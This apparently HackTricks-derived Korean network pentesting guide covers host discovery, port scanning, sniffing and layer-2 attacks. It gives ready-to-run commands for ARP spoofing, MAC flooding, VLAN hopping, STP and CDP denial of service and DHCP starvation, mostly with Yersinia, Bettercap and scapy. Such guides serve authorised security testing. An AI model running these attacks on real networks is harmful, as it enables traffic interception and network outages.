# Pentesting Network

{{#include ../../banners/hacktricks-training.md}}



## Discovering hosts from the outside

이 섹션은 **인터넷**에서 **응답하는 IP**를 찾는 방법에 대한 **간단한 섹션**입니다.\
이 상황에서는 몇 개의 **IP 범위**(어쩌면 여러 **범위**)가 있으며, **어떤 IP가 응답하는지** 찾기만 하면 됩니다.

### ICMP

이것은 호스트가 작동 중인지 여부를 확인하는 **가장 쉽고 빠른** 방법입니다.\
일부 **ICMP** 패킷을 보내고 **응답을 기대**할 수 있습니다. 가장 쉬운 방법은 **에코 요청**을 보내고 응답을 기대하는 것입니다. 간단한 `ping`을 사용하거나 **범위**에 대해 `fping`을 사용할 수 있습니다.\
또한 **nmap**을 사용하여 다른 유형의 ICMP 패킷을 보낼 수 있습니다(이는 일반적인 ICMP 에코 요청-응답 필터를 피할 수 있습니다).
```bash
ping -c 1 199.66.11.4    # 1 echo request to a host
fping -g 199.66.11.0/24  # Send echo requests to ranges
nmap -PE -PM -PP -sn -n 199.66.11.0/24 #Send echo, timestamp requests and subnet mask requests
```
### TCP 포트 탐지

모든 종류의 ICMP 패킷이 필터링되는 경우가 매우 흔합니다. 그러므로 호스트가 작동 중인지 확인하기 위해 할 수 있는 것은 **열려 있는 포트를 찾는 것**뿐입니다. 각 호스트는 **65535 포트**를 가지고 있으므로, "큰" 범위를 가지고 있다면 **각 호스트의 각 포트**가 열려 있는지 테스트할 수 없습니다. 그렇게 하면 너무 많은 시간이 소요됩니다.\
따라서 필요한 것은 **빠른 포트 스캐너** ([masscan](https://github.com/robertdavidgraham/masscan))와 **가장 많이 사용되는 포트 목록**입니다:
```bash
#Using masscan to scan top20ports of nmap in a /24 range (less than 5min)
masscan -p20,21-23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080 199.66.11.0/24
```
`nmap`을 사용하여 이 단계를 수행할 수도 있지만, 속도가 느리고 `nmap`이 호스트 식별에 문제가 있습니다.

### HTTP 포트 탐색

이것은 **HTTP** **서비스**를 발견하는 데 집중하고 싶을 때 유용한 TCP 포트 탐색입니다:
```bash
masscan -p80,443,8000-8100,8443 199.66.11.0/24
```
### UDP 포트 탐지

일부 **UDP 포트가 열려 있는지** 확인하여 **호스트에 더 많은 주의를 기울여야 하는지** 결정할 수 있습니다. UDP 서비스는 일반적으로 빈 UDP 프로브 패킷에 **데이터를 응답하지 않기** 때문에 포트가 필터링되고 있는지 또는 열려 있는지 말하기 어렵습니다. 이를 결정하는 가장 쉬운 방법은 실행 중인 서비스와 관련된 패킷을 보내는 것이며, 어떤 서비스가 실행되고 있는지 모르기 때문에 포트 번호를 기반으로 가장 가능성이 높은 것을 시도해야 합니다:
```bash
nmap -sU -sV --version-intensity 0 -F -n 199.66.11.53/24
# The -sV will make nmap test each possible known UDP service packet
# The "--version-intensity 0" will make nmap only test the most probable
```
제안된 nmap 명령은 **/24** 범위 내의 모든 호스트에서 **상위 1000 UDP 포트**를 테스트하지만, 이것만으로도 **>20분**이 걸립니다. **가장 빠른 결과**가 필요하다면 [**udp-proto-scanner**](https://github.com/portcullislabs/udp-proto-scanner)를 사용할 수 있습니다: `./udp-proto-scanner.pl 199.66.11.53/24` 이 명령은 **UDP 프로브**를 **예상 포트**로 전송합니다 ( /24 범위의 경우 단 1분이 걸립니다): _DNSStatusRequest, DNSVersionBindReq, NBTStat, NTPRequest, RPCCheck, SNMPv3GetRequest, chargen, citrix, daytime, db2, echo, gtpv1, ike, ms-sql, ms-sql-slam, netop, ntp, rpc, snmp-public, systat, tftp, time, xdmcp._

### SCTP 포트 탐지
```bash
#Probably useless, but it's pretty fast, why not try it?
nmap -T4 -sY -n --open -Pn <IP/range>
```
## Wifi 펜테스팅

여기에는 작성 당시 잘 알려진 모든 Wifi 공격에 대한 멋진 가이드가 있습니다:

{{#ref}}
../pentesting-wifi/
{{#endref}}

## 내부에서 호스트 발견하기

네트워크 내부에 있다면 가장 먼저 하고 싶은 것 중 하나는 **다른 호스트를 발견하는 것**입니다. **얼마나 많은 소음**을 낼 수/원하는지에 따라 다양한 작업을 수행할 수 있습니다:

### 수동

연결된 네트워크 내부에서 호스트를 수동으로 발견하기 위해 이러한 도구를 사용할 수 있습니다:
```bash
netdiscover -p
p0f -i eth0 -p -o /tmp/p0f.log
# Bettercap
net.recon on/off #Read local ARP cache periodically
net.show
set net.show.meta true #more info
```
### Active

[_**외부에서 호스트 발견하기**_](./#discovering-hosts-from-the-outside) (_TCP/HTTP/UDP/SCTP 포트 발견_)에서 언급된 기술은 여기에서도 **적용될 수 있습니다**.\
하지만, 다른 호스트와 **같은 네트워크**에 있으므로 **더 많은 작업**을 수행할 수 있습니다:
```bash
#ARP discovery
nmap -sn <Network> #ARP Requests (Discover IPs)
netdiscover -r <Network> #ARP requests (Discover IPs)

#NBT discovery
nbtscan -r 192.168.0.1/24 #Search in Domain

# Bettercap
net.probe on/off #Discover hosts on current subnet by probing with ARP, mDNS, NBNS, UPNP, and/or WSD
set net.probe.mdns true/false #Enable mDNS discovery probes (default=true)
set net.probe.nbns true/false #Enable NetBIOS name service discovery probes (default=true)
set net.probe.upnp true/false #Enable UPNP discovery probes (default=true)
set net.probe.wsd true/false #Enable WSD discovery probes (default=true)
set net.probe.throttle 10 #10ms between probes sent (default=10)

#IPv6
alive6 <IFACE> # Send a pingv6 to multicast.
```
### Active ICMP

_외부에서 호스트 발견하기_에서 언급된 기술들([_**ICMP**_](./#icmp))은 여기에서도 **적용될 수 있습니다**.\
하지만, 다른 호스트와 **같은 네트워크**에 있으므로 **더 많은 작업**을 수행할 수 있습니다:

- **서브넷 브로드캐스트 주소**에 **ping**을 보내면 ping이 **각 호스트**에 도달하고 그들이 **응답**할 수 있습니다: `ping -b 10.10.5.255`
- **네트워크 브로드캐스트 주소**에 ping을 보내면 **다른 서브넷** 내의 호스트도 찾을 수 있습니다: `ping -b 255.255.255.255`
- `nmap`의 `-PE`, `-PP`, `-PM` 플래그를 사용하여 각각 **ICMPv4 에코**, **타임스탬프**, **서브넷 마스크 요청**을 보내 호스트 발견을 수행합니다: `nmap -PE -PM -PP -sn -vvv -n 10.12.5.0/24`

### **Wake On Lan**

Wake On Lan은 **네트워크 메시지**를 통해 컴퓨터를 **켜는 데** 사용됩니다. 컴퓨터를 켜기 위해 사용되는 매직 패킷은 **MAC Dst**가 제공되고 그 후 같은 패킷 내에서 **16번 반복되는** 패킷입니다.\
이런 종류의 패킷은 일반적으로 **이더넷 0x0842** 또는 **포트 9로 UDP 패킷**으로 전송됩니다.\
**[MAC]**이 제공되지 않으면 패킷은 **브로드캐스트 이더넷**으로 전송됩니다(그리고 브로드캐스트 MAC이 반복됩니다).
```bash
# Bettercap (if no [MAC] is specificed ff:ff:ff:ff:ff:ff will be used/entire broadcast domain)
wol.eth [MAC] #Send a WOL as a raw ethernet packet of type 0x0847
wol.udp [MAC] #Send a WOL as an IPv4 broadcast packet to UDP port 9
```
## 호스트 스캐닝

깊이 스캔하고자 하는 모든 IP(외부 또는 내부)를 발견한 후, 다양한 작업을 수행할 수 있습니다.

### TCP

- **열린** 포트: _SYN --> SYN/ACK --> RST_
- **닫힌** 포트: _SYN --> RST/ACK_
- **필터링된** 포트: _SYN --> \[응답 없음]_
- **필터링된** 포트: _SYN --> ICMP 메시지_
```bash
# Nmap fast scan for the most 1000tcp ports used
nmap -sV -sC -O -T4 -n -Pn -oA fastscan <IP>
# Nmap fast scan for all the ports
nmap -sV -sC -O -T4 -n -Pn -p- -oA fullfastscan <IP>
# Nmap fast scan for all the ports slower to avoid failures due to -T4
nmap -sV -sC -O -p- -n -Pn -oA fullscan <IP>

#Bettercap Scan
syn.scan 192.168.1.0/24 1 10000 #Ports 1-10000
```
### UDP

UDP 포트를 스캔하는 방법은 2가지가 있습니다:

- **UDP 패킷**을 전송하고 포트가 **닫혀** 있으면 _**ICMP 도달 불가**_ 응답을 확인합니다 (여러 경우에 ICMP가 **필터링**되므로 포트가 닫혀 있거나 열려 있는지에 대한 정보를 받지 못할 수 있습니다).
- **형식화된 데이터그램**을 전송하여 **서비스**(예: DNS, DHCP, TFTP 등, _nmap-payloads_에 나열된 것들)로부터 응답을 유도합니다. **응답**을 받으면 포트가 **열려** 있습니다.

**Nmap**은 "-sV"를 사용하여 두 가지 옵션을 **혼합**합니다 (UDP 스캔은 매우 느립니다), 하지만 UDP 스캔이 TCP 스캔보다 느리다는 점에 유의하세요:
```bash
# Check if any of the most common udp services is running
udp-proto-scanner.pl <IP>
# Nmap fast check if any of the 100 most common UDP services is running
nmap -sU -sV --version-intensity 0 -n -F -T4 <IP>
# Nmap check if any of the 100 most common UDP services is running and launch defaults scripts
nmap -sU -sV -sC -n -F -T4 <IP>
# Nmap "fast" top 1000 UDP ports
nmap -sU -sV --version-intensity 0 -n -T4 <IP>
# You could use nmap to test all the UDP ports, but that will take a lot of time
```
### SCTP 스캔

**SCTP (스트림 제어 전송 프로토콜)**은 **TCP (전송 제어 프로토콜)** 및 **UDP (사용자 데이터그램 프로토콜)**와 함께 사용되도록 설계되었습니다. 그 주요 목적은 IP 네트워크를 통해 전화 데이터의 전송을 용이하게 하여 **신호 시스템 7 (SS7)**에서 발견되는 많은 신뢰성 기능을 반영하는 것입니다. **SCTP**는 SS7 신호를 IP 네트워크를 통해 전송하는 것을 목표로 하는 **SIGTRAN** 프로토콜 패밀리의 핵심 구성 요소입니다.

**SCTP**에 대한 지원은 **IBM AIX**, **Oracle Solaris**, **HP-UX**, **Linux**, **Cisco IOS**, **VxWorks**와 같은 다양한 운영 체제에서 제공되며, 이는 통신 및 네트워킹 분야에서의 폭넓은 수용과 유용성을 나타냅니다.

nmap은 SCTP에 대해 두 가지 다른 스캔을 제공합니다: _-sY_ 및 _-sZ_
```bash
# Nmap fast SCTP scan
nmap -T4 -sY -n -oA SCTFastScan <IP>
# Nmap all SCTP scan
nmap -T4 -p- -sY -sV -sC -F -n -oA SCTAllScan <IP>
```
### IDS 및 IPS 회피

{{#ref}}
ids-evasion.md
{{#endref}}

### **추가 nmap 옵션**

{{#ref}}
nmap-summary-esp.md
{{#endref}}

### 내부 IP 주소 공개

**잘못 구성된 라우터, 방화벽 및 네트워크 장치**는 때때로 **비공식 소스 주소**를 사용하여 네트워크 프로브에 응답합니다. **tcpdump**는 테스트 중에 개인 주소에서 수신된 패킷을 식별하는 데 사용할 수 있습니다. 특히 Kali Linux에서는 **eth2 인터페이스**에서 패킷을 캡처할 수 있으며, 이는 공용 인터넷에서 접근 가능합니다. NAT 또는 방화벽 뒤에 설정이 있는 경우 이러한 패킷은 필터링될 가능성이 높다는 점에 유의해야 합니다.
```bash
tcpdump –nt -i eth2 src net 10 or 172.16/12 or 192.168/16
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth2, link-type EN10MB (Ethernet), capture size 65535 bytes
IP 10.10.0.1 > 185.22.224.18: ICMP echo reply, id 25804, seq 1582, length 64
IP 10.10.0.2 > 185.22.224.18: ICMP echo reply, id 25804, seq 1586, length 64
```
## 스니핑

스니핑을 통해 캡처된 프레임과 패킷을 검토하여 IP 범위, 서브넷 크기, MAC 주소 및 호스트 이름에 대한 세부 정보를 배울 수 있습니다. 네트워크가 잘못 구성되었거나 스위칭 패브릭이 스트레스를 받는 경우, 공격자는 수동 네트워크 스니핑을 통해 민감한 자료를 캡처할 수 있습니다.

스위치된 이더넷 네트워크가 제대로 구성된 경우, 귀하는 브로드캐스트 프레임과 귀하의 MAC 주소로 전송되는 자료만 볼 수 있습니다.

### TCPDump
```bash
sudo tcpdump -i <INTERFACE> udp port 53 #Listen to DNS request to discover what is searching the host
tcpdump -i <IFACE> icmp #Listen to icmp packets
sudo bash -c "sudo nohup tcpdump -i eth0 -G 300 -w \"/tmp/dump-%m-%d-%H-%M-%S-%s.pcap\" -W 50 'tcp and (port 80 or port 443)' &"
```
원격 머신에서 SSH 세션을 통해 Wireshark를 GUI로 사용하여 실시간으로 패킷을 캡처할 수 있습니다.
```
ssh user@<TARGET IP> tcpdump -i ens160 -U -s0 -w - | sudo wireshark -k -i -
ssh <USERNAME>@<TARGET IP> tcpdump -i <INTERFACE> -U -s0 -w - 'port not 22' | sudo wireshark -k -i - # Exclude SSH traffic
```
### Bettercap
```bash
net.sniff on
net.sniff stats
set net.sniff.output sniffed.pcap #Write captured packets to file
set net.sniff.local  #If true it will consider packets from/to this computer, otherwise it will skip them (default=false)
set net.sniff.filter #BPF filter for the sniffer (default=not arp)
set net.sniff.regexp #If set only packets matching this regex will be considered
```
### Wireshark

명백히.

### 자격 증명 캡처

[https://github.com/lgandx/PCredz](https://github.com/lgandx/PCredz)와 같은 도구를 사용하여 pcap 또는 라이브 인터페이스에서 자격 증명을 파싱할 수 있습니다.

## LAN 공격

### ARP 스푸핑

ARP 스푸핑은 기계의 IP가 우리의 장치의 MAC임을 나타내기 위해 불필요한 ARP 응답을 보내는 것입니다. 그러면 피해자는 ARP 테이블을 변경하고 스푸핑된 IP에 연락할 때마다 우리의 장치에 연락하게 됩니다.

#### **Bettercap**
```bash
arp.spoof on
set arp.spoof.targets <IP> #Specific targets to ARP spoof (default=<entire subnet>)
set arp.spoof.whitelist #Specific targets to skip while spoofing
set arp.spoof.fullduplex true #If true, both the targets and the gateway will be attacked, otherwise only the target (default=false)
set arp.spoof.internal true #If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the Internet (default=false)
```
#### **Arpspoof**
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -t 192.168.1.1 192.168.1.2
arpspoof -t 192.168.1.2 192.168.1.1
```
### MAC Flooding - CAM 오버플로우

스위치의 CAM 테이블을 오버플로우시키기 위해 다양한 소스 MAC 주소를 가진 많은 패킷을 전송합니다. CAM 테이블이 가득 차면 스위치는 허브처럼 동작하기 시작합니다(모든 트래픽을 브로드캐스트).
```bash
macof -i <interface>
```
현대 스위치에서는 이 취약점이 수정되었습니다.

### 802.1Q VLAN / DTP 공격

#### 동적 트렁킹

**Dynamic Trunking Protocol (DTP)**는 트렁킹을 위한 자동 시스템을 용이하게 하기 위해 설계된 링크 계층 프로토콜로, 스위치가 트렁크 모드(Trunk) 또는 비트렁크 모드에서 포트를 자동으로 선택할 수 있도록 합니다. **DTP**의 배치는 종종 최적이 아닌 네트워크 설계를 나타내며, 필요할 때만 수동으로 트렁크를 구성하고 적절한 문서를 보장하는 것이 중요함을 강조합니다.

기본적으로 스위치 포트는 동적 자동 모드로 설정되어 있어, 이웃 스위치에 의해 트렁킹을 시작할 준비가 되어 있습니다. 보안 문제는 펜테스터나 공격자가 스위치에 연결하고 DTP Desirable 프레임을 전송하여 포트를 트렁크 모드로 강제할 때 발생합니다. 이 작업은 공격자가 STP 프레임 분석을 통해 VLAN을 열거하고 가상 인터페이스를 설정하여 VLAN 세분화를 우회할 수 있게 합니다.

많은 스위치에서 기본적으로 DTP가 존재하는 것은 적들이 스위치의 동작을 모방하여 모든 VLAN의 트래픽에 접근할 수 있도록 악용될 수 있습니다. 스크립트 [_**dtpscan.sh**_](https://github.com/commonexploits/dtpscan)는 인터페이스를 모니터링하여 스위치가 기본(Default), 트렁크(Trunk), 동적(Dynamic), 자동(Auto) 또는 액세스(Access) 모드에 있는지를 나타냅니다. 이 중 액세스 모드만이 VLAN 홉핑 공격에 면역인 구성입니다. 이 도구는 스위치의 취약성 상태를 평가합니다.

네트워크 취약성이 확인되면, _**Yersinia**_ 도구를 사용하여 DTP 프로토콜을 통해 "트렁킹 활성화"를 수행하여 모든 VLAN의 패킷을 관찰할 수 있습니다.
```bash
apt-get install yersinia #Installation
sudo apt install kali-linux-large #Another way to install it in Kali
yersinia -I #Interactive mode
#In interactive mode you will need to select a interface first
#Then, you can select the protocol to attack using letter "g"
#Finally, you can select the attack using letter "x"

yersinia -G #For graphic mode
```
![](<../../images/image (269).png>)

VLAN을 열거하기 위해 [**DTPHijacking.py**](https://github.com/in9uz/VLANPWN/blob/main/DTPHijacking.py)** 스크립트를 사용하여 DTP Desirable 프레임을 생성할 수도 있습니다. 어떤 상황에서도 스크립트를 중단하지 마십시오. DTP Desirable을 매 3초마다 주입합니다. **스위치에서 동적으로 생성된 트렁크 채널은 5분 동안만 유지됩니다. 5분 후에 트렁크가 끊어집니다.**
```
sudo python3 DTPHijacking.py --interface eth0
```
**Access/Desirable (0x03)**는 DTP 프레임이 Desirable 유형임을 나타내며, 이는 포트가 Trunk 모드로 전환하도록 지시합니다. 그리고 **802.1Q/802.1Q (0xa5)**는 **802.1Q** 캡슐화 유형을 나타냅니다.

STP 프레임을 분석함으로써, **VLAN 30과 VLAN 60의 존재에 대해 알게 됩니다.**

<figure><img src="../../images/image (124).png" alt=""><figcaption></figcaption></figure>

#### 특정 VLAN 공격

VLAN ID와 IP 값을 알게 되면, **특정 VLAN을 공격하기 위해 가상 인터페이스를 구성할 수 있습니다.**\
DHCP가 사용 가능하지 않으면, _ifconfig_를 사용하여 정적 IP 주소를 설정하십시오.
```
root@kali:~# modprobe 8021q
root@kali:~# vconfig add eth1 250
Added VLAN with VID == 250 to IF -:eth1:-
root@kali:~# dhclient eth1.250
Reloading /etc/samba/smb.conf: smbd only.
root@kali:~# ifconfig eth1.250
eth1.250  Link encap:Ethernet  HWaddr 00:0e:c6:f0:29:65
inet addr:10.121.5.86  Bcast:10.121.5.255  Mask:255.255.255.0
inet6 addr: fe80::20e:c6ff:fef0:2965/64 Scope:Link
UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
RX packets:19 errors:0 dropped:0 overruns:0 frame:0
TX packets:13 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:0
RX bytes:2206 (2.1 KiB)  TX bytes:1654 (1.6 KiB)

root@kali:~# arp-scan -I eth1.250 10.121.5.0/24
```

```bash
# Another configuration example
modprobe 8021q
vconfig add eth1 20
ifconfig eth1.20 192.168.1.2 netmask 255.255.255.0 up
```

```bash
# Another configuration example
sudo vconfig add eth0 30
sudo ip link set eth0.30 up
sudo dhclient -v eth0.30
```
#### Automatic VLAN Hopper

논의된 공격인 **Dynamic Trunking과 가상 인터페이스 생성 및 다른 VLAN 내 호스트 발견**은 도구에 의해 **자동으로 수행됩니다**: [**https://github.com/nccgroup/vlan-hopping---frogger**](https://github.com/nccgroup/vlan-hopping---frogger)

#### Double Tagging

공격자가 **희생자 호스트의 MAC, IP 및 VLAN ID 값을** 알고 있다면, 그는 **프레임을 두 번 태그**하여 지정된 VLAN과 희생자의 VLAN으로 패킷을 전송할 수 있습니다. **희생자가 공격자와 다시 연결할 수 없기 때문에**, **공격자가 UDP를 통해 통신하는 것이 최선의 선택입니다**. 이는 흥미로운 작업을 수행할 수 있는 프로토콜(SNMP와 같은)과 관련이 있습니다.

공격자의 또 다른 옵션은 **공격자가 제어하는 IP를 스푸핑하여 희생자가 접근할 수 있는 TCP 포트 스캔을 시작하는 것입니다**(아마도 인터넷을 통해). 그런 다음, 공격자는 희생자로부터 패킷을 수신하는지 확인하기 위해 자신이 소유한 두 번째 호스트에서 스니핑할 수 있습니다.

![](<../../images/image (190).png>)

이 공격을 수행하려면 scapy를 사용할 수 있습니다: `pip install scapy`
```python
from scapy.all import *
# Double tagging with ICMP packet (the response from the victim isn't double tagged so it will never reach the attacker)
packet = Ether()/Dot1Q(vlan=1)/Dot1Q(vlan=20)/IP(dst='192.168.1.10')/ICMP()
sendp(packet)
```
#### Lateral VLAN Segmentation Bypass <a href="#d679" id="d679"></a>

당신이 **직접 연결된 스위치에 접근할 수 있다면**, 네트워크 내에서 **VLAN 세분화를 우회할 수 있는 능력**이 있습니다. 단순히 **포트를 트렁크 모드로 전환**하고 (트렁크라고도 알려져 있음), 대상 VLAN의 ID로 가상 인터페이스를 생성한 후 IP 주소를 구성합니다. 주소를 동적으로 요청할 수도 있고 (DHCP), 정적으로 구성할 수도 있습니다. 이는 경우에 따라 다릅니다.

{{#ref}}
lateral-vlan-segmentation-bypass.md
{{#endref}}

#### Layer 3 Private VLAN Bypass

게스트 무선 네트워크와 같은 특정 환경에서는 **포트 격리(프라이빗 VLAN이라고도 함)** 설정이 구현되어 무선 액세스 포인트에 연결된 클라이언트가 서로 직접 통신하는 것을 방지합니다. 그러나 이러한 격리 조치를 우회할 수 있는 기술이 확인되었습니다. 이 기술은 네트워크 ACL의 부족 또는 잘못된 구성을 이용하여 IP 패킷이 라우터를 통해 동일한 네트워크의 다른 클라이언트에 도달할 수 있도록 합니다.

공격은 **목표 클라이언트의 IP 주소를 포함하지만 라우터의 MAC 주소를 가진 패킷을 생성**하여 실행됩니다. 이로 인해 라우터는 패킷을 잘못 전달하여 대상 클라이언트에게 전달하게 됩니다. 이 접근 방식은 피해자가 접근할 수 있는 호스트를 제어하여 보안 결함을 악용하는 더블 태깅 공격에서 사용되는 방식과 유사합니다.

**공격의 주요 단계:**

1. **패킷 제작:** 목표 클라이언트의 IP 주소를 포함하지만 라우터의 MAC 주소를 가진 패킷을 특별히 제작합니다.
2. **라우터 동작 악용:** 제작된 패킷이 라우터로 전송되며, 구성으로 인해 패킷이 대상 클라이언트로 리디렉션되어 프라이빗 VLAN 설정에 의해 제공되는 격리를 우회합니다.

### VTP Attacks

VTP (VLAN Trunking Protocol)는 VLAN 관리를 중앙 집중화합니다. VLAN 데이터베이스 무결성을 유지하기 위해 수정 번호를 사용하며, 수정이 이루어질 때마다 이 번호가 증가합니다. 스위치는 더 높은 수정 번호로 구성된 설정을 채택하여 자신의 VLAN 데이터베이스를 업데이트합니다.

#### VTP Domain Roles

- **VTP Server:** VLAN을 관리합니다—생성, 삭제, 수정. 도메인 구성원에게 VTP 발표를 방송합니다.
- **VTP Client:** VTP 발표를 수신하여 VLAN 데이터베이스를 동기화합니다. 이 역할은 로컬 VLAN 구성 수정이 제한됩니다.
- **VTP Transparent:** VTP 업데이트에 참여하지 않지만 VTP 발표를 전달합니다. VTP 공격의 영향을 받지 않으며, 수정 번호는 항상 0으로 유지됩니다.

#### VTP Advertisement Types

- **Summary Advertisement:** VTP 서버에 의해 300초마다 방송되며, 필수 도메인 정보를 포함합니다.
- **Subset Advertisement:** VLAN 구성 변경 후 전송됩니다.
- **Advertisement Request:** VTP 클라이언트가 Summary Advertisement를 요청하기 위해 발행하며, 일반적으로 더 높은 구성 수정 번호를 감지한 후에 발생합니다.

VTP 취약점은 트렁크 포트를 통해서만 악용될 수 있으며, VTP 발표는 오직 트렁크 포트를 통해서만 순환합니다. DTP 공격 후 시나리오는 VTP로 전환될 수 있습니다. Yersinia와 같은 도구는 VTP 공격을 용이하게 하여 VLAN 데이터베이스를 삭제하고 네트워크를 효과적으로 중단시키는 것을 목표로 할 수 있습니다.

참고: 이 논의는 VTP 버전 1 (VTPv1)에 관한 것입니다.
````bash
%% yersinia -G # Launch Yersinia in graphical mode ```
````
Yersinia의 그래픽 모드에서 VLAN 데이터베이스를 정리하기 위해 모든 VTP VLAN 삭제 옵션을 선택하십시오.

### STP 공격

**인터페이스에서 BPDU 프레임을 캡처할 수 없다면 STP 공격에 성공할 가능성이 낮습니다.**

#### **STP BPDU DoS**

많은 BPDUs TCP (Topology Change Notification) 또는 Conf (토폴로지가 생성될 때 전송되는 BPDUs)를 전송하면 스위치가 과부하되어 제대로 작동하지 않게 됩니다.
```bash
yersinia stp -attack 2
yersinia stp -attack 3
#Use -M to disable MAC spoofing
```
#### **STP TCP 공격**

TCP가 전송되면 스위치의 CAM 테이블이 15초 후에 삭제됩니다. 그런 다음, 이러한 종류의 패킷을 지속적으로 전송하면 CAM 테이블이 지속적으로 (또는 매 15초마다) 재시작되고, 재시작될 때 스위치는 허브처럼 동작합니다.
```bash
yersinia stp -attack 1 #Will send 1 TCP packet and the switch should restore the CAM in 15 seconds
yersinia stp -attack 0 #Will send 1 CONF packet, nothing else will happen
```
#### **STP 루트 공격**

공격자는 스위치의 동작을 시뮬레이션하여 네트워크의 STP 루트가 됩니다. 그런 다음 더 많은 데이터가 그를 통해 전달됩니다. 이는 두 개의 다른 스위치에 연결되어 있을 때 흥미롭습니다.\
이는 **우선순위** 값이 실제 루트 스위치의 실제 우선순위보다 낮다고 말하는 BPDUs CONF 패킷을 전송하여 수행됩니다.
```bash
yersinia stp -attack 4 #Behaves like the root switch
yersinia stp -attack 5 #This will make the device behaves as a switch but will not be root
```
**공격자가 2개의 스위치에 연결되어 있다면 그는 새로운 트리의 루트가 될 수 있으며, 그 스위치들 간의 모든 트래픽은 그를 통과하게 됩니다** (MITM 공격이 수행될 것입니다).
```bash
yersinia stp -attack 6 #This will cause a DoS as the layer 2 packets wont be forwarded. You can use Ettercap to forward those packets "Sniff" --> "Bridged sniffing"
ettercap -T -i eth1 -B eth2 -q #Set a bridge between 2 interfaces to forwardpackages
```
### CDP 공격

CISCO Discovery Protocol (CDP)는 CISCO 장치 간의 통신에 필수적이며, 이를 통해 **서로를 식별하고 구성 세부정보를 공유**할 수 있습니다.

#### 수동 데이터 수집 <a href="#id-0e0f" id="id-0e0f"></a>

CDP는 모든 포트를 통해 정보를 브로드캐스트하도록 구성되어 있어 보안 위험을 초래할 수 있습니다. 공격자는 스위치 포트에 연결하면 **Wireshark**, **tcpdump** 또는 **Yersinia**와 같은 네트워크 스니퍼를 배포할 수 있습니다. 이 작업은 네트워크 장치에 대한 민감한 데이터를 드러낼 수 있으며, 여기에는 모델과 실행 중인 Cisco IOS 버전이 포함됩니다. 공격자는 식별된 Cisco IOS 버전의 특정 취약점을 목표로 삼을 수 있습니다.

#### CDP 테이블 플러딩 유도 <a href="#id-0d6a" id="id-0d6a"></a>

보다 공격적인 접근 방식은 합법적인 CISCO 장치인 척하여 스위치의 메모리를 압도함으로써 서비스 거부(DoS) 공격을 시작하는 것입니다. 아래는 Yersinia를 사용하여 이러한 공격을 시작하기 위한 명령어 시퀀스입니다:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
이 공격 동안 스위치의 CPU와 CDP 이웃 테이블이 심각하게 부담을 받아 과도한 자원 소비로 인해 종종 **“네트워크 마비”**라고 불리는 상태에 이르게 됩니다.

#### CDP 임프ersonation 공격
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
[**scapy**](https://github.com/secdev/scapy/)를 사용할 수도 있습니다. `scapy/contrib` 패키지로 설치하는 것을 잊지 마세요.

### VoIP 공격 및 VoIP Hopper 도구

VoIP 전화는 IoT 장치와 점점 더 통합되어 있으며, 특별한 전화번호를 통해 문을 열거나 온도 조절기를 제어하는 기능을 제공합니다. 그러나 이러한 통합은 보안 위험을 초래할 수 있습니다.

도구 [**voiphopper**](http://voiphopper.sourceforge.net)는 다양한 환경(Cisco, Avaya, Nortel, Alcatel-Lucent)에서 VoIP 전화를 에뮬레이트하도록 설계되었습니다. CDP, DHCP, LLDP-MED 및 802.1Q ARP와 같은 프로토콜을 사용하여 음성 네트워크의 VLAN ID를 발견합니다.

**VoIP Hopper**는 Cisco Discovery Protocol (CDP)에 대해 세 가지 모드를 제공합니다:

1. **Sniff Mode** (`-c 0`): VLAN ID를 식별하기 위해 네트워크 패킷을 분석합니다.
2. **Spoof Mode** (`-c 1`): 실제 VoIP 장치의 패킷을 모방하는 사용자 정의 패킷을 생성합니다.
3. **Spoof with Pre-made Packet Mode** (`-c 2`): 특정 Cisco IP 전화 모델의 패킷과 동일한 패킷을 전송합니다.

속도를 위해 선호되는 모드는 세 번째 모드입니다. 다음을 지정해야 합니다:

- 공격자의 네트워크 인터페이스(`-i` 매개변수).
- 에뮬레이트되는 VoIP 장치의 이름(`-E` 매개변수), Cisco 명명 형식(예: MAC 주소 뒤에 SEP)을 준수해야 합니다.

기업 환경에서 기존 VoIP 장치를 모방하기 위해 다음을 수행할 수 있습니다:

- 전화기의 MAC 라벨을 검사합니다.
- 전화기의 디스플레이 설정을 탐색하여 모델 정보를 확인합니다.
- VoIP 장치를 노트북에 연결하고 Wireshark를 사용하여 CDP 요청을 관찰합니다.

세 번째 모드에서 도구를 실행하는 예제 명령은 다음과 같습니다:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP 공격

#### 열거
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

**DoS의 두 가지 유형**은 DHCP 서버에 대해 수행될 수 있습니다. 첫 번째는 **모든 가능한 IP 주소를 사용하기 위해 충분한 가짜 호스트를 시뮬레이션하는 것**입니다.\
이 공격은 DHCP 서버의 응답을 볼 수 있고 프로토콜을 완료할 수 있을 때만 작동합니다 (**Discover** (Comp) --> **Offer** (server) --> **Request** (Comp) --> **ACK** (server)). 예를 들어, **Wifi 네트워크에서는 이것이 불가능합니다**.

DHCP DoS를 수행하는 또 다른 방법은 **모든 가능한 IP를 소스 코드로 사용하여 DHCP-RELEASE 패킷을 보내는 것**입니다. 그러면 서버는 모든 사용자가 IP 사용을 마쳤다고 생각할 것입니다.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
보다 자동화된 방법은 도구 [DHCPing](https://github.com/kamorin/DHCPig)을 사용하는 것입니다.

